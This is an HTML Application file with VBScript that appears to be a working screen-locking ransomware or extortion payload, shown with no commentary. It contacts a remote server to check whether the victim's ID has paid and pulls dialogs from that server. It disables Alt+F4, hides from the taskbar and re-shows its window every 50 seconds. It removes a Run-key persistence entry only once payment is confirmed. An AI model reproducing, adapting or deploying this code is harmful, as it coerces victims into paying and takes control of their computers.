<HTML>
<HEAD>
<HTA:APPLICATION APPLICATIONNAME="P" BORDER="none" INNERBORDER="no" SCROLL="no" CONTEXTMENU="no" SHOWINTASKBAR="no" SELECTION="no" SINGLEINSTANCE="no">
<SCRIPT LANGUAGE="VBScript">
Option Explicit

Const ID = "R127FHTX"
Const PREFIX = "1"
Const BASE_URL = "http://rocket-m.info/"
Const CHECK_URL = "http://rocket-m.info/ctrl.php?c=chkpay&id="

Dim intCnt

Function GetCookie(strName)
	Dim strCookie
	Dim aryCookieData
	Dim i, j
	strCookie = document.cookie
	aryCookieData = split(strCookie, ";")
	j = Ubound(aryCookieData)
	For i = 0 To j
		If left(Trim(aryCookieData(i)), len(strName)) = strName Then
			GetCookie = mid(Trim(aryCookieData(i)), len(strName)+2)
			Exit Function
		End If
	Next
End Function

Function CheckPaid
	Dim objWinHttp
	Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
	objWinHttp.Open "GET", CHECK_URL & ID, False
	On Error Resume Next
	objWinHttp.Send
	If Err.Number = 0 Then
		If objWinHttp.Status = "200" Then
			CheckPaid = objWinHttp.responseText
		Else
			CheckPaid = 0
		End If
	Else
		CheckPaid = 0
	End If
	On Error Goto 0
	Set objWinHttp = Nothing
End Function

Function GetName
	Dim objWinHttp
	Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
	objWinHttp.Open "GET", BASE_URL & "player/" & PREFIX & "/" & ID & "/name.dat", False
	On Error Resume Next
	objWinHttp.Send
	If Err.Number = 0 Then
		If objWinHttp.Status = "200" Then
			GetName = objWinHttp.responseText
		Else
			GetName = ""
		End If
	Else
		GetName = ""
	End If
	On Error Goto 0
	Set objWinHttp = Nothing
End Function

Sub Activate
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	objShell.sendKeys "%{TAB}"
	Set objShell = Nothing
End Sub

Sub ShowPlayer
	Dim name
	name = GetName

	Dim intStat
	intStat = CheckPaid

	Dim intTx, intTy
	Rem intTx = (screen.availWidth - 750) / 2
	intTx = 0
	Rem intTy = (screen.availHeight - 500) / 2
	intTy = 0

	window.focus()

	If intStat = 1 Then
		Dim strURL
		strURL = BASE_URL & "p2.htm"
		window.showModalDialog strURL, name, "dialogWidth:750px;dialogHeight:500px;scroll:no;"
	Else
		window.showModalDialog BASE_URL & "player/" & PREFIX & "/" & ID & "/p2.hta", intCnt, "dialogTop:" & intTy & ";dialogLeft:"  & intTx & ";dialogWidth:750px;dialogHeight:500px;scroll:no;"
	End If

	intStat = CheckPaid

	Dim objShell

	If intStat = 1 Then
		Set objShell = CreateObject("WScript.Shell")
		On Error Resume Next
		objShell.RegDelete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\za"
		On Error Goto 0
		Set objShell = Nothing

		window.close
	Else
		window.setTimeout "ShowPlayer", 50000, "VBScript"
		intCnt = intCnt + 1
		Activate
	End If
End Sub

Function CheckKey
	If window.event.altKey And window.event.keyCode = 115 Then
		document.parentWindow.event.keyCode = 0
		document.parentWindow.event.cancelBubble = true
		document.parentWindow.event.returnvalue = false
	End If
End Function

Sub Window_onLoad
	window.moveTo 0, 0
	window.resizeTo 1, 1
	intCnt = 0
	ShowPlayer
End Sub
</SCRIPT>
</HEAD>
<BODY STYLE="background:#000;" onkeydown="CheckKey"></BODY>
</HTML>
